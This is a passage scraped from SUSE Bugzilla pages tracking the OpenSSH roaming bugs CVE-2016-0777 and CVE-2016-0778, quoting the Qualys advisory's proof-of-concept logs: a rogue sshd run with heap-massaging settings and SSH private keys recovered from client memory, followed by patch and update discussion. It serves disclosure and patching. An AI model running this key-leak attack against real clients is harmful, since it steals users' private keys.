5.8, 2048-bit RSA key ------------------------------------------------------------------------  $ head -n 1 /etc/motd OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015  $ /usr/bin/ssh -V OpenSSH_7.0, LibreSSL 2.2.2  $ cat ~/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEAwe9ssfYbABhOGxnBDsPf5Hwypr3tVz4ZCK2Q9ZWWBYnk+KVL ruLv7NWzeuKF7ls8z4SdpP/09QIIWQO5xWmQ7OM7ndfHWexFoyS/MijorHLvwG1s 17KFF8aC5vcBTfVkWnFaERueyd+mxv+oIrskA3/DK7/Juojkq70aPAdafiWOuVT8 L/2exFuzpSmwiXbPuiPgImO9O+9VQ4flZ4qlO18kZxXF948GisxxkceOYWTIX6uh xSs/NEGF/drmB4RTAL1ZivG+e4IMxs5naLz4u3Vb8WTDeS6D62WM1eq5JRdlZtGP vavL01Kv3sYFvoD0OPUU4BjU8bd4Qb30C3719wIDAQABAoIBAG4zFpipN/590SQl Jka1luvGhyGoms0QRDliJxTlwzGygaGoi7D800jIxgv13BTtU0i4Grw/lXoDharP Kyi6K9fv51hx3J2EXK2vm9Vs2YnkZcf6ZfbLQkWYT5nekacy4ati7cL65uffZm19 qJTTsksqtkSN3ptYXlgYRGgH5av3vaTSTGStL8D0e9fcrjSdN0UntjBB7QGT8ZnY gQ1bsSlcPM/TB6JYmHWdpCAVeeCJdDhYoHKlwgQuTdpubdlM80f6qat7bsm95ZTK QolQFpmAXeU4Bs5kFlm0K0qYFkWNdI16ScOpK6AQZGUTcHICeRL3GEm6NC0HYBNt gKHPucECgYEA7ssL293PZR3W9abbivDxvtCjA+41L8Rl8k+J0Dj0QTQfeHxHD2eL cQO2lx4N3E9bJMUnnmjxIT84Dg7SqOWThh3Rof+c/vglyy5o/CzbScISQTvjKfuB +s5aNojIqkyKaesQyxmdacLxtBBppZvzCDTHBXvAe4t8Bus2DPBzbzsCgYEAz+jl hcsMQ1egiVVpxHdjtm3+D1lbgITk0hzIt9DYEIMBJ7y5Gp2mrcroJAzt7VA2s7Ri hBSGv1pjz4j82l00odjCyiUrwvE1Gs48rChzT1PcQvtPCCanDvxOHwpKlUTdUKZh vhxPK/DW3IgUL0MlaTOjncR1Zppz4xpF/cSlYHUCgYB0MhVZLXvHxlddPY5C86+O nFNWjEkRL040NIPo8G3adJSDumWRl18A5T+qFRPFik/depomuQXsmaibHpdfXCcG 8eeaHpm0b+dkEPdBDkq+f1MGry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V 8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg== -----END RSA PRIVATE KEY-----  # "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -o ProxyCommand="/usr/bin/nc -w 1 %h %p" -p 222 127.0.0.1 [connection suspended, press return to resume]Segmentation fault (core dumped)  (this example requires a ProxyCommand because of the NULL-aitop bug described in the Mitigating Factors of the Information Leak section, and crashes because of the NULL-pointer dereference discussed in the Mitigating Factors of the Buffer Overflow section)  # cat /tmp/roaming-a5eca355/infoleak ry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V 8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==  ------------------------------------------------------------------------ Private Key Disclosure example: CentOS 7, 1024-bit DSA key ------------------------------------------------------------------------  $ grep PRETTY_NAME= /etc/os-release PRETTY_NAME="CentOS Linux 7 (Core)"  $ /usr/bin/ssh -V OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013  $ cat ~/.ssh/id_dsa -----BEGIN DSA PRIVATE KEY----- MIIBvQIBAAKBgQDmjJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5n GLnZn1lmDldNaqhV0ECESXZVEpq/8TR2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsCioD2 hUaU7sV6Nho9fJIclxuxZP8j+uzidQKKN/+CVbQougsLsBlstpuQ4Hr2DHmalL8X iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/ QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS F9AoVoZFKEGn4FEoYIqY3a4= -----END DSA PRIVATE KEY-----  # env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 ...  # strings /tmp/roaming-b7b16dfc/infoleak jJYHvennuPmKGxfMuNc4nW2Z1via6FkkZILWOO1QJLB5OXqe kt7t/AAr+1n0lJbC1Q8hP01LFnxKoqqWfHQIuQL+S88yr5T8KY/VxV9uCVKpQk5  # strings /tmp/roaming-b324ce87/infoleak IuQL R2m2XjSmE+7Y14hI0cjBdnOz2X8wIVAP0a Nmtvmc4H+iFvKorV4B+tqRmvAoGBAKjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC o7l7mJT+lI9v  # strings /tmp/roaming-24011739/infoleak KjE7ps031YRb6S3htr/ncPlXKtNTSTwaakC o7l7mJT+lI9vTrQsu3QCLAUZnmVHAIj/m9juk8kXkZvEBXJuPVdL0tCRNAsC  # strings /tmp/roaming-37456846/infoleak LsBlstpuQ4Hr2DHmalL8X iISkLhuyAoGBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZNA yq4Kwj/  # strings /tmp/roaming-988ff54c/infoleak GBAKKRxVAVr2Q72Xz6vRmbULRvsfG1sSxNHOssA9CWKByOjDr2mo1l B7oIhTZ+eGvtHjiOozM0PzlcRSu5ZY3ZN2hfXITp9/4oatxFUV5V8aniqyq4Kwj/  # strings /tmp/roaming-53887fa5/infoleak /4oatxFUV5V8aniqyq4Kwj/ QlCmHO7eRlPArhylx8uRnoHkbTRe+by5fmPImz/3WUtgPnx8y3NOEsCtAhUApdtS F9AoVoZFKEGn4FEoYIqY3a4  ------------------------------------------------------------------------ Private Key Disclosure example: Fedora 20, 2048-bit RSA key ------------------------------------------------------------------------  $ grep PRETTY_NAME= /etc/os-release PRETTY_NAME="Fedora 20 (Heisenbug)"  $ /usr/bin/ssh -V OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013  $ cat ~/.ssh/id_rsa -----BEGIN RSA PRIVATE KEY----- MIIEogIBAAKCAQEAmbj/XjOppLWSAhuLKiRoHsdp66LJdY2PvP0ht3GWDKKCk7Gz HLas5VjotS9rmupavGGDiicMHPClOttWAI9MRyvP77iZhSei/RzX1/UKk/broTDp o9ljBnQTzRAyw8ke72Ih77SOGfOLBvYlx80ZmESLYYH95aAeuuDvb236JnsgRPDQ /B/gyRIhfqis70USi05/ZbnAenFn+v9zoSduDYMzSM8mFmh9f+9PVb9qMHdfNkIy 2E78kt9BknU/bEcCWyL+IXNLV0rgRGAcE0ncKu13YvuH/7o4Q7bW2FYErT4P/FHK cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o 6GEmk/oB9w9gf1zGqWkTytMiqcawMW4LZAJlSI/rGWe7lYHuceZSSgzd5lF4VP06 Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+prtAxpPNfKElEV7ZPBrTRAuCUr Hiy7yflZ3w0qHekNafX/tnWiU4zi/p6aD4rs10YaYSnSolsDs2k8wHbVP4VtLE8l PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo /euhzdYixxIkfqyopnYFoER26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa jwj3EZsXmtP+wd3fhge7pIHp5RiKfBn0JtSvXQQHO0k0eEcQ4aA/6yESI62wOuaY vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y 3fBC3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4syLfm qK+cwb7uCSi5PfloRiLryPdvnobDGLfFGdOHaX7km+4u5+taYg2Er8IsAxtMNwM5 r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+ ZS16+aH97RKdJD/4qiskzzHvZs+wi4LKPHHHz7ETXr/m4CRfMIU= -----END RSA PRIVATE KEY-----  # env ROAMING="heap_massaging:linux" "`pwd`"/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key  $ /usr/bin/ssh -p 222 127.0.0.1 ...  # strings /tmp/roaming-a2bbc5f6/infoleak cRmpbVfAzJQb85uXUXaNLVW0A/gHqTaGCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CG  # strings /tmp/roaming-47b46456/infoleak RGAcE0nc GCUWJUwIDAQABAoIBAD0ZpB8MR9SY+uTt j737ZIs/VeF7/blEwCotLvacJjj1axNLYVb7YPN0CGLj61BS8CfKVp9V7+Gc4P/o 6GEmk/oB9  # strings /tmp/roaming-7a6717ae/infoleak cawMW4LZ1 Xz/wTMkSDZh/M6zOnQhImcLforsiPbTKKIVLL6u13VUmDcYfaBh9VepjyN8i+KIV JQB26MlXSxuAp8o0BQUI8FY/dsObJ9xjMT/u2+p  # strings /tmp/roaming-f3091f08/infoleak lZ3w0qHe nSolsDs2k8wHbVP4VtLE8l PRfXS6ECgYEAyVf7Pr3TwTa0pPEk1dLz3XHoetTqUND/0Kv+i7MulBzJ4LbcsTEJ  # strings /tmp/roaming-62a9e9a3/infoleak lZ3w0qHe r3TwTa0pPEk11 LbcsTEJ rtOuGGpLrAYlIvCgT+F26mov5fRGsjjnmP3P/PsvzR8Y9DhiWl9R7qyvNznQYxjo /euhzdYixxIkfqyopnYFoER26u37/OHe37P  # strings /tmp/roaming-8de31ed5/infoleak 7qyvNznQ 26u37/OHe37PH+8U1JitVrhv7s4NYztECgYEAw3Ot gxMqsKh42ydIv1sBg1QEHu0TNvyYy7WCB8jnMsygUQ8EEJs7iKP//CEGRdDAwyGa  # strings /tmp/roaming-f5e0fbcc/infoleak yESI62wOuaY vJ+q7WMo1wHtMoqRPtW/OAxUf91dQRtzK/GpRuMCgYAc7lh6vnoT9FFmtgPN+b7y 3fBC3h9BN5banCw6VKfnvm8/q+bwSxS  # strings /tmp/roaming-9be933df/infoleak QRtzK/GpRuMC1 C3h9BN5banCw6VKfnvm8/q+bwSxSSG3aTqYpwEH37lEnk0IfuzQ1O5JfX+hdF Q4tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmT  # strings /tmp/roaming-ee4d1e6c/infoleak SG3aTqYp tEVa+bsNE8HnH7fGDgg821iMgpxSWNfvNECXX71t6JmTOun5zVV6EixsmDn80P pdyhj8fAUU/BceHr/H6hUQKBgCX5SqPlzGyIPvrtVf//s  # strings /tmp/roaming-c2bfd69c/infoleak SG3aTqYp 6JmTOun5zVV6A H6hUQKBgCX5SqPlzGyIPvrtVf//sXqPj0Fm9E3Bo/ooKLxU dz7ybM9y6GpFjrqMioa07+AOn/UJiVry9fXQuTRWre+CqRQEWpuqtgPR0c4s  # strings /tmp/roaming-2b3217a1/infoleak DGLfFGdO r5bbAoGAfxRRGMamXIha8xaJwQnHKC/9v7r79LPFoht/EJ7jw/k8n8yApoLBLBYp P/jXU44sbtWB3g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCQ  # strings /tmp/roaming-1e275747/infoleak g3eARxPL3HBLVVMWfW9ob7XxI4lKqCQ9cuKCBqosVbEQhNKZAj+ ``` [Comment 2](show_bug.cgi?id=961642#c2)  Johannes Segitz   2016-01-13 08:30:59 UTC  ``` CRD: 2016-01-14 9:00 AM PST ``` [Comment 7](show_bug.cgi?id=961642#c7)  Johannes Segitz   2016-01-13 12:05:45 UTC  ``` I tested the provided reproducer (sshd with poc available at [https://build.suse.de/package/show/home:jsegitz:branches:SUSE:SLE-12:Update/openssh](https://build.suse.de/package/show/home%3Ajsegitz%3Abranches%3ASUSE%3ASLE-12%3AUpdate/openssh)) I couldn't reproduce when connecting from SLE 11 SP3, SLE 12 GA or Leap (Leap uses SLE 12 ssh, so no surprise there). That doesn't necessarily mean that we're not vulnerable there. SLE 11 SP3 with 8k keys should be vulnerable, but the poc probably doesn't test this ``` [Comment 14](show_bug.cgi?id=961642#c14)  Andreas Stieger   2016-01-13 15:55:20 UTC  ``` QA hint for verifying the roaming feature is wiped:  Affected client in default config: > debug1: Roaming not allowed by server  Original client, when run with "-oUseRoaming=no" or  'UseRoaming no' in ssh_config or ~/.ssh/config will not print this.  Expected behavior for the fixed client: Never print this, even when -oUseRoaming=yes is specified or 'UseRoaming yes' is in ssh_config or ~/.ssh/config. ``` [Comment 18](show_bug.cgi?id=961642#c18)  Johannes Segitz   2016-01-14 08:15:45 UTC  ``` Created [attachment 661720](attachment.cgi?id=661720&action=diff "Final upstream patch") [[details]](attachment.cgi?id=661720&action=edit "Final upstream patch") Final upstream patch ``` [Comment 20](show_bug.cgi?id=961642#c20)  Sascha Weber   2016-01-14 08:41:20 UTC  ``` What about customers with LTSS on SLES 11 SP1 and SP 2?  I think there might even be some valid accounts with SLES 10 SP4 out there.  Thank, Sascha ``` [Comment 22](show_bug.cgi?id=961642#c22)  Sascha Weber   2016-01-14 09:12:16 UTC  ``` But [Comment#5](show_bug.cgi?id=961642#c5) only talks about SLES 11 SP4 and SLES 12. nothing about the LTSS products !  Also, I have started to put together the TID for the Knowledgebase. I need someone to review it and provide feedback. The TID is marked as INTERNAL only, so you have to login to see the content: <https://www.suse.com/support/kb/doc.php?id=7017154> ``` [Comment 23](show_bug.cgi?id=961642#c23)  Sascha Weber   2016-01-14 10:33:58 UTC  ``` Feedback from Markus Meissner: As only 5.4 and newer are affected, the 5.1p1 versions  in SLES 11 SP2, SP1, SLES 10 SP4 and older products are not affected. ``` [Comment 24](show_bug.cgi?id=961642#c24)  Bernhard Wiedemann   2016-01-14 17:00:09 UTC  ``` This is an autogenerated message for OBS integration: This bug (961642) was mentioned in <https://build.opensuse.org/request/show/353722> 13.2 / openssh ``` [Comment 25](show_bug.cgi?id=961642#c25)  Johannes Segitz   2016-01-14 17:21:50 UTC  ``` Official advisory by Qualys: <https://www.qualys.com/2016/01/14/cve-2016-0777-cve-2016-0778/openssh-cve-2016-0777-cve-2016-0778.txt>  SUSE would like to thank Qualys for the detailed report. ``` [Comment 26](show_bug.cgi?id=961642#c26)  Swamp Workflow Management   2016-01-14 19:11:42 UTC  ``` SUSE-SU-2016:0117-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 11-SECURITY (src):    openssh-openssl1-6.6p1-10.1 ``` [Comment 27](show_bug.cgi?id=961642#c27)  Swamp Workflow Management   2016-01-14 19:12:21 UTC  ``` SUSE-SU-2016:0118-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 12-SP1 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Server 12 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Desktop 12-SP1 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 SUSE Linux Enterprise Desktop 12 (src):    openssh-6.6p1-33.1, openssh-askpass-gnome-6.6p1-33.1 ``` [Comment 28](show_bug.cgi?id=961642#c28)  Swamp Workflow Management   2016-01-14 19:12:59 UTC  ``` SUSE-SU-2016:0119-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server for VMWare 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Server 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Desktop 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 SUSE Linux Enterprise Debuginfo 11-SP3 (src):    openssh-6.2p2-0.24.1, openssh-askpass-gnome-6.2p2-0.24.3 ``` [Comment 29](show_bug.cgi?id=961642#c29)  Swamp Workflow Management   2016-01-14 19:13:36 UTC  ``` SUSE-SU-2016:0120-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: SUSE Linux Enterprise Server 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 SUSE Linux Enterprise Desktop 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 SUSE Linux Enterprise Debuginfo 11-SP4 (src):    openssh-6.6p1-16.1, openssh-askpass-gnome-6.6p1-16.4 ``` [Comment 30](show_bug.cgi?id=961642#c30)  Andreas Stieger   2016-01-14 22:40:36 UTC  ``` Releasing openSUSE updates, resolving as fixed. ``` [Comment 31](show_bug.cgi?id=961642#c31)  Swamp Workflow Management   2016-01-15 02:11:18 UTC  ``` openSUSE-SU-2016:0127-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE 13.2 (src):    openssh-6.6p1-5.3.1, openssh-askpass-gnome-6.6p1-5.3.1 ``` [Comment 32](show_bug.cgi?id=961642#c32)  Swamp Workflow Management   2016-01-15 02:11:53 UTC  ``` openSUSE-SU-2016:0128-1: An update that fixes two vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE Leap 42.1 (src):    openssh-6.6p1-8.1, openssh-askpass-gnome-6.6p1-8.1 ``` [Comment 33](show_bug.cgi?id=961642#c33)  Bernhard Wiedemann   2016-01-15 08:00:08 UTC  ``` This is an autogenerated message for OBS integration: This bug (961642) was mentioned in <https://build.opensuse.org/request/show/353786> 13.1 / openssh ``` [Comment 34](show_bug.cgi?id=961642#c34)  Bernhard Wiedemann   2016-01-15 12:00:08 UTC  ``` This is an autogenerated message for OBS integration: This bug (961642) was mentioned in <https://build.opensuse.org/request/show/353827> Evergreen:11.4+13.1 / openssh ``` [Comment 35](show_bug.cgi?id=961642#c35)  Bernhard Wiedemann   2016-01-15 13:00:09 UTC  ``` This is an autogenerated message for OBS integration: This bug (961642) was mentioned in <https://build.opensuse.org/request/show/353838> Evergreen:11.4 / openssh ``` [Comment 36](show_bug.cgi?id=961642#c36)  Swamp Workflow Management   2016-01-16 02:11:13 UTC  ``` openSUSE-SU-2016:0144-1: An update that fixes three vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-077,CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE Evergreen 11.4 (src):    openssh-5.8p1-11.1, openssh-askpass-gnome-5.8p1-11.1 ``` [Comment 37](show_bug.cgi?id=961642#c37)  Swamp Workflow Management   2016-01-16 02:11:46 UTC  ``` openSUSE-SU-2016:0145-1: An update that fixes three vulnerabilities is now available.  Category: security (critical) Bug References: 961642,961645 CVE References: CVE-2016-077,CVE-2016-0777,CVE-2016-0778 Sources used: openSUSE 13.1 (src):    openssh-6.2p2-3.7.1, openssh-askpass-gnome-6.2p2-3.7.1 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=961642)
* - [XML](show_bug.cgi?ctype=xml&id=961642)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=961642)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D961642)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from bugzilla.suse.com_8ec390d3_20250126_125242.html ===


| Bugzilla – Bug 961645 | VUL-0: CVE-2016-0778: openssh: Buffer overflow in roaming code | Last modified: 2019-06-16 14:38:17 UTC |
| --- | --- | --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D961645)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

[**Bug 961645**](show_bug.cgi?id=961645)
(CVE-2016-0778)
- VUL-0: CVE-2016-0778: openssh: Buffer overflow in roaming code

[Summary:](page.cgi?id=glossary.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
VUL-0: CVE-2016-0778: openssh: Buffer overflow in roaming code

| | [Status](page.cgi?id=status_resolution_matrix.html): | RESOLVED FIXED | | --- | --- | |  | | | [Alias:](page.cgi?id=glossary.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2016-0778 | |  | | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | SUSE Security Incidents | | [Classification:](page.cgi?id=glossary.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Novell Products | | [Component:](describecomponents.cgi?product=SUSE Security Incidents "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | Incidents ([show other bugs](buglist.cgi?component=Incidents&product=SUSE%20Security%20Incidents&bug_status=__open__)) | | [Version:](page.cgi?id=glossary.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=glossary.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Other Other | |  | | | [Priority](page.cgi?id=glossary.html#priority): | P5 - None **Severity**: Normal | | [Target Milestone:](page.cgi?id=glossary.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=glossary.html#assigned_to "The person in charge of resolving the bug.") | Security Team bot | | [QA Contact:](page.cgi?id=glossary.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") | Security Team bot | |  | | | [URL:](page.cgi?id=glossary.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=glossary.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") | CVSSv2:SUSE:CVE-2016-0778:4.0:(AV:N/A... | | [Keywords:](describekeywords.cgi "You can add keywords from a defined list to bugs, in order to easily identify and group them.") |  | |  | | | [Depends on:](page.cgi?id=glossary.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") |  | | [Blocks:](page.cgi?id=glossary.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") |  | |  | | Reported: | 2016-01-13 08:36 UTC by Johannes Segitz | | --- | --- | | Modified: | 2019-06-16 14:38 UTC ([History](show_activity.cgi?id=961645)) | | CC List: | 12 users (show)  ab alexander.runge andreas.thomas astieger forgotten\_-82siXJqhV haral.tsitsivas jhura jsegitz meissner pcerny security-team thomas | |  | | | [See Also:](page.cgi?id=glossary.html#see_also "This allows you to refer to bugs in other installations. You can enter a URL to a bug in the 'Add Bug URLs' field to note that that bug is related to this one. You can enter multiple URLs at once by separating them with whitespace. You should normally use this field to refer to bugs in other installations. For bugs in this installation, it is better to use the Depends on and Blocks fields.") |  | | [Found By:](page.cgi?id=glossary.html#cf_foundby "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Services Priority:](page.cgi?id=glossary.html#cf_nts_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Business Priority:](page.cgi?id=glossary.html#cf_biz_priority "A custom Free Text field in this installation of Bugzilla.") |  | | [Blocker:](page.cgi?id=glossary.html#cf_blocker "A custom Drop Down field in this installation of Bugzilla.") | --- | | [Marketing QA Status:](page.cgi?id=glossary.html#cf_marketing_qa_status "A custom Drop Down field in this installation of Bugzilla.") | --- | | [IT Deployment:](page.cgi?id=glossary.html#cf_it_deployment "A custom Drop Down field in this installation of Bugzilla.") | --- | |  | |  * [Clone This Bug](enter_bug.cgi?cloned_bug_id=961645) |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | | | --- | --- | | [**Final upstream patch**](attachment.cgi?id=661721 "View the content of the attachment") (2.22 KB, patch)  [2016-01-14 08:16 UTC](#attach_661721 "Go to the comment associated with the attachment"), Johannes Segitz | [Details](attachment.cgi?id=661721&action=edit) | [Diff](attachment.cgi?id=661721&action=diff) | | [View All](attachment.cgi?bugid=961645&action=viewall)  [Add an attachment](attachment.cgi?bugid=961645&action=enter) (proposed patch, testcase, etc.) | |   | Note You need to [log in](show_bug.cgi?id=961645&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. | | --- | |  |
| --- | --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=961645#c0)  Johannes Segitz   2016-01-13 08:36:42 UTC  ``` Qualys reports:  Support for roaming was elegantly added to the OpenSSH client: the calls to read() and write() that communicate with the SSH server were replaced by calls to roaming_read() and roaming_write(), two wrappers that depend on wait_for_roaming_reconnect() to transparently reconnect to the server after a disconnection. The wait_for_roaming_reconnect() routine is essentially a sequence of four subroutines:  239 int 240 wait_for_roaming_reconnect(void) 241 { ... 250         fprintf(stderr, "[connection suspended, press return to resume]"); ... 252         packet_backup_state(); 253         /* TODO Perhaps we should read from tty here */ 254         while ((c = fgetc(stdin)) != EOF) { ... 259                 if (c != '\n' && c != '\r') 260                         continue; 261 